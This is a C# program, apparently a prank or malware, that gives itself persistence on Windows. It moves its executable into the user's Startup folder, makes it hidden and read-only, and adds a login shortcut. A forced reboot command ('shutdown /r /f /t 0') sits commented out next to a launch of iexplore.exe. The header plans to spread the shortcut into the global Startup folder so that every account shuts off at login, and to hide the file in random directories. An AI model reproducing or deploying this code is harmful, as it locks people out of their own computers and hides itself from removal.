using System;
using System.IO;
using IWshRuntimeLibrary;
using System.Diagnostics;
using System.ComponentModel;

/*=============================================================================
 |       AUTHOR:  N/A
 |     LANGUAGE:  Visual C# Command Line Compiler v4.7.3056.0
 |   TO COMPILE:  csc .\ShutDown.cs
 +-----------------------------------------------------------------------------
 |
 |  DESCRIPTION:  ***WARNING!!!*** RUNNING THE EXECUTABLE IS AT YOUR DISCRETION.
 |
 |        INPUT:  N/A
 |
 |       OUTPUT:  CREATES A SHUTDOWN.LNK FILE IN A USER'S STARTUP DIRECTORY THAT 
 |                FORCIBLY RUNS THE SHUTDOWN.EXE APPLICATION EVERYTIME THE HOST'S
 |                ACCOUNT IS LOGGED INTO. 
 |
 | COUNTERMEASURES: 
 |
 | IMPROVEMENTS: 1 - OVERRIDING PERMISSIONS ON THE GLOBAL STARTUP DIRECTORY AND INJECTING
 |               THE SHUTDOWN.LNK FILE INTO IT WILL BE CATASTROPHIC TO A COMPUTER
 |               AS PROGRAMS WITHIN THE GLOBAL DIRECTORY TAKES RUNNING PRECEDENCE 
 |               OVER APPLICATIONS IN THE LOCAL STARTUP. THIS IMPLIES THAT ALL USER ACCOUNTS
 |               WILL SHUTOFF WHEN LOGGED INTO!
 |
 |               2 - Instead of exe being placed in startupDir, it should place itself in random
 |               directory. If permission issue arises, keep on randomly walking until a permissible
 |               path is found
 |
 |   Known Bugs:  N/A
 |
 *===========================================================================*/

public sealed class ShutDown{   
    private string localStartupDir;
    private static readonly string SHUTDOWN_CMD = @"C:\Windows\System32\shutdown.exe";
    private static readonly string SHUTDOWN_ARGS = "/r /f /t 0"; 
    private static readonly string C_SHARP_EXE = "ShutDown.exe";

    public ShutDown(){
        setLocalStartupDir();   
    }

    public void setLocalStartupDir(){
        string pathTemplate = @"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"; 
        this.localStartupDir = pathTemplate.Replace("{0}", Environment.UserName);
        }

    public string getLocalStartupDir(){
        return this.localStartupDir;
    }

    public string getAppCurrentDirectory(){
        string dir = "";
        try{
            dir = Directory.GetCurrentDirectory();
        }
        catch(Exception e){
            Console.WriteLine("Exception caught: " + e.ToString()); 
        }
        return dir + @"\";
    }

    public bool createShortcutFile(string exeFilePath){
        bool isCreated = false;
        if(File.Exists(exeFilePath)){
            try{
                WshShell shell = new WshShell();
                IWshShortcut link = 
                (IWshShortcut)shell.CreateShortcut(this.localStartupDir +"ShutDown.lnk");
                link.TargetPath = exeFilePath;
                link.Save();
                isCreated = true;
                return isCreated;
            }
            catch(Exception e){
                Console.WriteLine("Exception caught: " + e.ToString());
            }
        }
        return isCreated;
    }

    /*Features
    *1 - Does not delete if destfile is already present in path
    *2 - Makes destFile hidden and readonly
    */
    private int moveFile(String sourceFile, String destFile){
        int isMoved = 0;
        if(!File.Exists(destFile)){
            try{
                File.Move(sourceFile, destFile);
                File.SetAttributes(destFile, FileAttributes.Hidden | FileAttributes.ReadOnly);
                isMoved = 1;
                }
            catch(Exception e){
                Console.WriteLine("Exception caught: " + e.ToString());
                isMoved = -1; 
                }
        }
        return isMoved;
    }

    public int moveExeToStartupDir(){
        string currentExeFilePath = this.getAppCurrentDirectory() + C_SHARP_EXE;
        string destExeFilePath = localStartupDir + C_SHARP_EXE;
        return moveFile(currentExeFilePath, destExeFilePath);
    }

    // public int moveExeToRandDir(){
    //     string currentExeFilePath = this.getAppCurrentDirectory() + C_SHARP_EXE;
    //     string destExeFilePath = this.findRandPath() + C_SHARP_EXE;
    //     return moveFile(currentExeFilePath, destExeFilePath);
    // }

    public bool runTurnOffCMD(){
        Process myProcess = new Process();
        myProcess.StartInfo.FileName = "iexplore.exe";
        //myProcess.StartInfo.FileName = SHUTDOWN_CMD;
        //myProcess.StartInfo.Arguments = SHUTDOWN_ARGS;
        myProcess.StartInfo.CreateNoWindow = true;
        try{
            return myProcess.Start();        
        }
        catch(Exception e){
            Console.WriteLine("Exception caught " + e.ToString()); 
        }
        return false;
    }
        
    /*Move exe file to startup dir then create shortcut in startup dir
     *If exe file cannot be placed within startup dir
     *then shortcut is created based on exe current location, then moved to startup
     */  
    public static void Main(){
        ShutDown sysOff = new ShutDown(); 
        int moveToStartupStatus = sysOff.moveExeToStartupDir();
        Console.WriteLine(moveToStartupStatus);

        if(moveToStartupStatus == 1){
            int createShortcutFileStatus = 
            sysOff.createShortcutFile(sysOff.getLocalStartupDir() + C_SHARP_EXE);
            Console.WriteLine(createShortcutFileStatus);
            sysOff.runTurnOffCMD();
        }
        else{
            sysOff.createShortcutFile(sysOff.getAppCurrentDirectory() + C_SHARP_EXE);
            sysOff.runTurnOffCMD();
        }
        }
}
